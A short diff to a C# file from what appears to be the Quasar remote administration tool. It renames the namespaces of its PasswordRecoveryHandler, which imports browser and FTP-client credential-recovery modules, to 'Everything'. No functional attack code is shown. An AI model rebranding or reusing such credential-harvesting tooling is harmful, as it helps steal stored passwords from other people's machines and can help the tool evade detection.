@@ -1,4 +1,4 @@
-﻿using Quasar.Client.Recovery;
+﻿using Everything.Recovery;
 using Quasar.Client.Recovery.Browsers;
 using Quasar.Client.Recovery.FtpClients;
 using Quasar.Common.Messages;
@@ -8,7 +8,7 @@ using System;
 using System.Collections.Generic;
 using System.Diagnostics;
 
-namespace Quasar.Client.MessageHandlers
+namespace Everything.MessageHandlers
 {
     public class PasswordRecoveryHandler : IMessageProcessor
     {
